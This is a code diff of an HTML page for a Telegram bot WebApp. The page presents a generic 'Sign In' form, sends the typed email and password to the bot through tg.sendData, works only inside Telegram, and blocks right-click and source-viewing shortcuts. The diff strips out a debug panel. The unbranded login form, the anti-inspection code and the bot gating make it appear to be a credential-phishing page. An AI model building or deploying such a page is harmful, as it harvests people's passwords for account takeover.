@@ -45,13 +45,6 @@ button:not(:disabled):active{opacity:.8;}
 #block h2{font-size:20px;margin-bottom:10px;}
 #block p{color:var(--tg-theme-hint-color,#8899a6);line-height:1.6;font-size:14px;}
 #form{display:none;}
-/* debug panel */
-#dbg{
-  margin-top:20px;padding:12px;border-radius:10px;
-  background:rgba(255,255,255,.06);font-size:11px;
-  word-break:break-all;line-height:1.7;display:none;
-  -webkit-user-select:text;user-select:text;
-}
 </style>
 </head>
 <body>
@@ -60,7 +53,6 @@ button:not(:disabled):active{opacity:.8;}
     <div class="ico">⛔</div>
     <h2>Доступ запрещён</h2>
     <p>Работает только внутри Telegram<br>через кнопку бота.</p>
-    <div id="dbg"></div>
   </div>
   <div id="form">
     <h1 id="title">🔐 Sign In</h1>
@@ -88,30 +80,11 @@ button:not(:disabled):active{opacity:.8;}
        (e.ctrlKey&&['U','S'].indexOf(e.key.toUpperCase())>=0)){e.preventDefault();return false;}
   });
 
-  var params  = new URLSearchParams(window.location.search);
-  var debug   = params.get('debug') === '1';
-  var mode    = params.get('mode') || 'login';
-
-  var tg      = window.Telegram && window.Telegram.WebApp;
+  var tg       = window.Telegram && window.Telegram.WebApp;
   var hasProxy = typeof window.TelegramWebviewProxy !== 'undefined';
   var initData = tg ? (tg.initData || '') : '';
-  var platform = tg ? (tg.platform || 'n/a') : 'n/a';
+  var mode     = new URLSearchParams(window.location.search).get('mode') || 'login';
 
-  // Show debug info if ?debug=1 (helps diagnose issues from Telegram)
-  if(debug){
-    var d = document.getElementById('dbg');
-    d.style.display = 'block';
-    d.innerHTML =
-      '<b>tg exists:</b> '     + !!tg           + '<br>' +
-      '<b>WebviewProxy:</b> '  + hasProxy        + '<br>' +
-      '<b>platform:</b> '      + platform        + '<br>' +
-      '<b>initData len:</b> '  + initData.length + '<br>' +
-      '<b>initData[:60]:</b> ' + initData.slice(0,60);
-  }
-
-  // Accept if:
-  //   (a) SDK loaded + initData non-empty, OR
-  //   (b) native bridge exists (SDK may fail to load but Telegram webview is real)
   var inTelegram = (tg && initData.length > 0) || hasProxy;
 
   if(!inTelegram){
@@ -119,7 +92,6 @@ button:not(:disabled):active{opacity:.8;}
     return;
   }
 
-  // ── Inside Telegram — show form ───────────────────────────────────────────
   if(tg){ tg.ready(); tg.expand(); tg.MainButton.hide(); }
 
   if(mode==='af'){
@@ -138,7 +110,6 @@ button:not(:disabled):active{opacity:.8;}
     var errEl = document.getElementById('err');
     var btn   = document.getElementById('btn');
     errEl.textContent = '';
-
     if(!email || email.indexOf('@')<1 || email.length<5){
       errEl.textContent='❌ Введите корректный email';
       document.getElementById('email').focus(); return;
@@ -147,7 +118,6 @@ button:not(:disabled):active{opacity:.8;}
       errEl.textContent='❌ Введите пароль';
       document.getElementById('password').focus(); return;
     }
-
     btn.disabled=true; btn.textContent='⏳ Отправка…';
     tg.sendData(JSON.stringify({mode:mode,email:email,password:pw}));
   }
